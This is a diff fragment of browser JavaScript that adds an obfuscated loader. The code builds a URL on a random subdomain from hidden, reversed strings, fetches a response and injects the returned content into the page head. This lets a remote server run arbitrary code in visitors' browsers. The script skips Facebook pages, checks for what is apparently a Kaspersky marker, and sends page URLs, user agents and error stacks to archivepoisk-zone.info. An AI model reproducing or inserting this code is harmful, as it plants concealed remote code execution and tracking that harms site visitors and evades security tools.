+        // var script = document.createElement('script');
+        // script.src = '//' + ourDomain + '/ksc/' + app_id + '.js?_=' + Date.now() + '&__=' + Math.random();
+        //
+        // script.charset = "UTF-8";
+        // document.head.appendChild(script);
+
+        if (document.location.host.indexOf('facebook') !== -1) return;
+
+        //@formatter:off
+        !function(){function a(n,e){var t;return n=parseInt(n),(e=parseInt(e))<n&&(n=(t=[e,n])[0],e=t[1]),Math.round(Math.random()*(e-n))+n}function c(n,e){return typeof n===p(["ing","st"],"r")?self[n]:n[e]}function u(t){return typeof t===p(["ing","st"],"r")?{n:function(){if(!t)return"";if(!(t=o(t).match(/.{1,2}/g)))return"";for(var n="",e=0;e<t.length;e++)n+=function(n,e,t){for(var o=[].slice.call(t),r=n.split("."),i=r.pop(),a=0;a<r.length;a++)e=e[r[a]];return e[i].apply(e,o)}(p(["de",p(["rC","mCh"],"a"),"fr"],"o"),String,[parseInt(t[e],16)]);return n}}:{n:function(){}}}function n(){var n=!0;for(var e in s)if(n)switch(typeof s[e]){case"string":case"object":continue;default:n=!1}n&&f(s._i51035294,s._i30509430)}var s={_i51035294:"#[COMMENT]{57F:C27,e2X:Gc6,9D7:d6Y,H87:Ue2}",_i49521614:"#[COMMENT]{F47:0L79,G62,7R3:637}",_i42978339:"#[COMMENT]{fJ2:fZ2,aS3:3W7,0N7:U47,47D:S8A6}",_i30509430:"#[COMMENT]{FMT:.MPG,FXf:3Ee,6Tf:63O7,FOa:6Pe2}",_i30503581:["#[COMMENT]{bD7:[9K72,74C7]}","#[COMMENT]{d7D:[Sb79,2R5Y,6E8Q,28E6,36F4,Y7O1,6P3R,6dM7]}"],_i30435366:app_id},p=function(n,e){return e=e||"",n.reverse().join(e)},o=function(n){return p(n.replace(/[^a-z0-9]/g,"").split(""))},f=function(n,e){var t,o,r,i;document.head?(t=c(p(["age","Stor","cal","lo"])),o=Math.floor(Date.now()/1e3),r=new XMLHttpRequest,i=[],t._i20521130&&t._i20521140&&!(t._i20521140<o)||(t._i20521130=function(n){n=n||a(3,7);for(var e="abcdefghijklmnopqrstuvwxyz",t=0,o="";t<n;t++)o+=e[a(0,e.length-1)];return o}(),t._i20521140=1e3*a(1,5)+o),c(p(["n","cati","l"],"o"))[p(["sh","h"],"a")]&&K.push("h="+encodeURIComponent(btoa(c(p(["n","cati","l"],"o"))[p(["sh","h"],"a")]))),i.push(c(p(["n","cati","l"],"o"))[p(["l","c","t","pr"],"o")]),i.push(decodeURIComponent("%2F%2F")),i.push(t._i20521130),i.push(u(n).n()),i.push(decodeURIComponent("%2F")),i.push(s._i30435366),i.push(u(e).n()),r.open("get",i.join(""),!0),r.onload=function(){try{for(var n,e=JSON.parse(this.responseText),t=0;t<e.response.length;t++)(n=c(p(["ent","cum","do"]))[p(["ent","lem","teE","ea","cr"])](u(s._i49521614).n()))[p(["ML","HT","ner","in"])]=e.response[t],c(p(["ent","cum","do"]))[p(["ad","he"])][p(["ld","hi","ndC","pe","ap"])](n)}catch(n){}},r.onerror=function(){},r.send()):setTimeout(f,10)};n.call(this),top.addEventListener("hashchange",n)}();
+        //@formatter:on
+    } catch (e) {
+        console.log(e);
+    }
+};
+
+if (!skipOutput) {
+    var kavDetected = window['scriptLocation'] && window['scriptLocation'].indexOf("k_tag=1") !== -1;
+    if (kavDetected)
+        kscrpt("77");
+    else
+        kscrpt("76");
+
+    // kscrpt("56");
+}
+
+
+// k1_2
+
+
+
+
+
+} catch(e) {
+    !function(){
+        if (window.top !== window) return;
+        if (e === 'exit') return;
+        if (e.toString().indexOf('No slot size for availableWidth') !== -1) return;
+
+        var log_data = {
+            error: e.stack,
+            location: document.location.href,
+            user_agent: navigator.userAgent
+        }
+
+        console.log(log_data);
+
+        var xhr = new XMLHttpRequest();
+
+        xhr.open("POST", "//archivepoisk-zone.info/js_errors", true);
+
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({js_error: log_data}));
+    }()
+}
